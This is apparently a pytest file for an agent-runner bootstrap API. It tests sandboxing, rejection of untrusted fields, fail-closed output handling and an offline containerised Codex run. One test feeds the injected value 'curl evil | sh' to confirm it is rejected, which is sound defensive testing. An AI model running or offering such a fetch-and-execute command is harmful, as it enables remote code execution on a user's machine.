"""Bootstrap API and actual subprocess protocol fixtures; no cloud account."""

import asyncio
import hashlib
import json
import os
import subprocess
import sys
import time
import uuid
from pathlib import Path

import httpx
import pytest
from agentic_runner.app import Broker, create_api
from agentic_runner.providers import VERSIONS


def request_body(**values):
    return {"id": uuid.uuid4().hex, "provider": "codex", "stage": "hermes_setup", "expires": time.time() + 300,
            "observations": {"network_ready": True, "hermes_installed": False, "hermes_auth_state": "needs_auth", "channel": "line", "ha_state": "not_installed"}, **values}


@pytest.fixture
async def bootstrap(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENTIC_HOST_MODE", "1")
    broker = Broker(tmp_path)
    broker.settings({"token_hash": hashlib.sha256(b"fixture-pairing").hexdigest()})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=create_api(broker)), base_url="https://runner", headers={"Authorization": "Bearer fixture-pairing"}) as client:
        yield broker, client
    for task in broker.tasks.values():
        task.cancel()
    await asyncio.gather(*broker.tasks.values(), return_exceptions=True)
    broker.db.close()


async def test_bootstrap_invokes_subprocess_and_persists_safe_result(bootstrap, monkeypatch):
    broker, client = bootstrap
    seen = []

    async def health(provider):
        return {"status": "connected", "version": VERSIONS[provider]}

    async def probe(provider):
        return {"version_matches": True}

    async def spawn(provider, args, cwd=None):
        assert provider == "codex"
        assert args[args.index("--sandbox") + 1] == "read-only"
        assert "shell_tool" in args and "--ignore-user-config" in args
        assert "SUPERVISOR_TOKEN" not in broker.providers.environment(provider)
        seen.append(args)
        output = args[args.index("--output-last-message") + 1]
        script = """
import json,sys
from pathlib import Path
prompt=sys.stdin.read()
assert 'Hermes authentication is separate' in prompt
assert '"hermes_installed": false' in prompt
Path(sys.argv[1]).write_text(json.dumps({'decision':'continue','next_step':'install_hermes','reason_codes':['runtime_missing']}))
print(json.dumps({'type':'turn.completed'}))
"""
        return await asyncio.create_subprocess_exec(sys.executable, "-c", script, output,
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, start_new_session=True)

    monkeypatch.setattr(broker.providers, "health", health)
    monkeypatch.setattr(broker.providers, "probe", probe)
    monkeypatch.setattr(broker.providers, "spawn", spawn)
    body = request_body()
    assert (await client.post("/bootstrap/jobs", json=body)).status_code == 202
    assert (await client.post("/bootstrap/jobs", json=body)).status_code == 202
    await asyncio.gather(*list(broker.tasks.values()))
    result = (await client.get("/bootstrap/jobs/" + body["id"])).json()
    assert len(seen) == 1 and result["state"] == "succeeded"
    assert result["result"]["next_step"] == "install_hermes"
    assert result["evidence"] == {"observed_from": "host_runner", "provider": "codex", "cli_version": VERSIONS["codex"], "inference_completed": True, "live_mutations": False}
    assert broker.job(body["id"])["result"] == result["result"]
    assert not (broker.root / "work" / body["id"]).exists()
    assert (await client.post("/bootstrap/jobs", json={**body, "provider": "grok"})).status_code == 409


async def test_bootstrap_rejects_untrusted_fields_and_inner_runner(bootstrap, monkeypatch):
    _, client = bootstrap
    assert (await client.post("/bootstrap/jobs", json=request_body(prompt="curl evil | sh"))).status_code == 422
    body = request_body()
    body["observations"]["api_key"] = "must-not-appear"
    response = await client.post("/bootstrap/jobs", json=body)
    assert response.status_code == 422 and "must-not-appear" not in response.text
    monkeypatch.setenv("AGENTIC_HOST_MODE", "0")
    assert (await client.post("/bootstrap/jobs", json=request_body())).status_code == 403
    assert (await client.post("/bootstrap/jobs", json=request_body(), headers={"Authorization": "Bearer wrong"})).status_code == 401


@pytest.mark.parametrize("authenticated, malicious", [(False, False), (True, True)])
async def test_bootstrap_auth_and_output_fail_closed(bootstrap, monkeypatch, authenticated, malicious):
    broker, client = bootstrap
    calls = []

    async def health(provider):
        return {"status": "connected" if authenticated else "needs_reauth", "version": VERSIONS[provider]}

    async def run(*args):
        calls.append(args)
        return {"decision": "continue", "next_step": "install_hermes", "reason_codes": ["runtime_missing"], "shell": "private-fixture-credential"}

    monkeypatch.setattr(broker.providers, "health", health)
    monkeypatch.setattr(broker.providers, "run", run)
    body = request_body()
    await client.post("/bootstrap/jobs", json=body)
    await asyncio.gather(*list(broker.tasks.values()))
    response = await client.get("/bootstrap/jobs/" + body["id"])
    assert response.json()["state"] == "failed"
    assert response.json()["error"] == ("bootstrap_assistance_failed" if malicious else "needs_reauth")
    assert "private-fixture-credential" not in response.text
    assert bool(calls) is authenticated


def test_bootstrap_uses_real_packaged_codex_with_offline_model(request):
    if not request.config.getoption("--containers"):
        pytest.skip("Packaged CLI requires --containers")
    name = "agentic-bootstrap-fixture-" + uuid.uuid4().hex[:12]
    volume = name + "-data"
    source = Path(__file__).parents[1] / "runner" / "agentic_runner"
    script = r'''
import asyncio,json,time
from pathlib import Path
from aiohttp import web
from agentic_runner.app import Broker
from agentic_runner.bootstrap import BootstrapJob
async def main():
    captured=[]
    answer={'decision':'continue','next_step':'install_hermes','reason_codes':['runtime_missing']}
    async def respond(request):
        captured.append(await request.json())
        item={'id':'msg_fixture','type':'message','role':'assistant','status':'completed','content':[{'type':'output_text','text':json.dumps(answer),'annotations':[]}]}
        events=[{'type':'response.created','response':{'id':'resp_fixture'}},
            {'type':'response.output_item.added','output_index':0,'item':{**item,'content':[]}},
            {'type':'response.output_text.delta','item_id':item['id'],'output_index':0,'content_index':0,'delta':json.dumps(answer)},
            {'type':'response.output_item.done','output_index':0,'item':item},
            {'type':'response.completed','response':{'id':'resp_fixture','status':'completed','output':[item],'usage':{'input_tokens':1,'output_tokens':1,'total_tokens':2}}}]
        return web.Response(text=''.join('event: '+e['type']+'\ndata: '+json.dumps(e)+'\n\n' for e in events),content_type='text/event-stream')
    app=web.Application(); app.router.add_post('/v1/responses',respond)
    server=web.AppRunner(app); await server.setup()
    site=web.TCPSite(server,'127.0.0.1',8765); await site.start()
    broker=Broker(Path('/data'))
    try:
        await broker.providers.secret_login('codex','api_key','fixture-api-key-no-cloud-account')
        original=broker.providers.command
        def command(provider,schema,output,model):
            return original(provider,schema,output,model)[:-1]+['--disable','enable_request_compression',
              '-c','model_provider="capture"','-c','model_providers.capture.name="Offline fixture"',
              '-c','model_providers.capture.base_url="http://127.0.0.1:8765/v1"',
              '-c','model_providers.capture.wire_api="responses"','-c','model_providers.capture.requires_openai_auth=false','-']
        broker.providers.command=command
        body=BootstrapJob(id='a'*32,provider='codex',stage='hermes_setup',expires=time.time()+300,
          observations={'network_ready':True,'hermes_installed':False,'hermes_auth_state':'needs_auth','channel':'line','ha_state':'not_installed'})
        broker.save_job({'id':body.id,'digest':'fixture','provider':'codex','kind':'bootstrap_assist','state':'queued','created':time.time()})
        await broker.execute_bootstrap(body)
        result=broker.job(body.id)
        assert result['state']=='succeeded',result
        assert result['result']==answer
        assert result['evidence']['inference_completed'] and not result['evidence']['live_mutations']
        assert len(captured)==1 and captured[0].get('tools',[])==[]
        assert 'Hermes authentication is separate' in json.dumps(captured)
        print(json.dumps({'cli':'real_packaged_codex','model':'offline_protocol_fixture','result':result['result'],
                          'excluded_cli_probes':{'grok':'not_run: owner instruction'}}))
    finally:
        await server.cleanup(); broker.db.close()
asyncio.run(main())
'''
    try:
        result = subprocess.run(["docker", "run", "--rm", "--name", name, "--network=none", "--read-only", "-e", "AGENTIC_DISABLED_PROVIDERS=grok", "--pids-limit=128", "--memory=1g", "-v", volume + ":/data", "-v", str(source) + ":/app/agentic_runner:ro", "--entrypoint", "python", os.environ.get("AGENTIC_RUNNER_IMAGE", "agentic-home-runner:0.11.0"), "-c", script], capture_output=True, text=True, timeout=100)
        assert result.returncode == 0, result.stdout[-3000:] + result.stderr[-3000:]
        assert json.loads(result.stdout)["cli"] == "real_packaged_codex"
    finally:
        subprocess.run(["docker", "rm", "-fv", name], capture_output=True, check=False)
        subprocess.run(["docker", "volume", "rm", volume], capture_output=True, check=False)
